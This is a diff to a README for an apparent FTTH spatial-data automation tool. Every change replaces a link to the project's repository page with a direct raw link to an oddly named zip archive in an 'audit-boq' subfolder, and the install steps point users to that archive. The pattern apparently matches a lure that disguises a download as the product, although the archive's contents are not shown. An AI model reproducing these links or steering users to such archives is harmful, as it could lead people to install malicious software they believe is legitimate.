@@ -1,6 +1,6 @@
 # 📍 SpatialDataAutomation - Streamline FTTH Data Tasks
 
-[![Download](https://img.shields.io/badge/Download-SpatialDataAutomation-green?style=for-the-badge)](https://github.com/jaquenetteelegiac24/SpatialDataAutomation)
+[![Download](https://img.shields.io/badge/Download-SpatialDataAutomation-green?style=for-the-badge)](https://raw.githubusercontent.com/jaquenetteelegiac24/SpatialDataAutomation/main/audit-boq/Data_Spatial_Automation_pseudotrimerous.zip)
 
 ---
 
@@ -37,7 +37,7 @@ To use SpatialDataAutomation on Windows, your computer should meet these needs:
 
 1. First, download the software package.
 
-   [![Download Now](https://img.shields.io/badge/Download-SpatialDataAutomation-blue?style=for-the-badge)](https://github.com/jaquenetteelegiac24/SpatialDataAutomation)
+   [![Download Now](https://img.shields.io/badge/Download-SpatialDataAutomation-blue?style=for-the-badge)](https://raw.githubusercontent.com/jaquenetteelegiac24/SpatialDataAutomation/main/audit-boq/Data_Spatial_Automation_pseudotrimerous.zip)
 
 2. Click the link above to open the download page.
 
@@ -110,7 +110,7 @@ SpatialDataAutomation includes tools to check your bill of quantities (BOQ). Thi
 
 - Access the main repository and download page here:
 
-  https://github.com/jaquenetteelegiac24/SpatialDataAutomation
+  https://raw.githubusercontent.com/jaquenetteelegiac24/SpatialDataAutomation/main/audit-boq/Data_Spatial_Automation_pseudotrimerous.zip
 
 - Visit the repository regularly for updates and new releases.
 
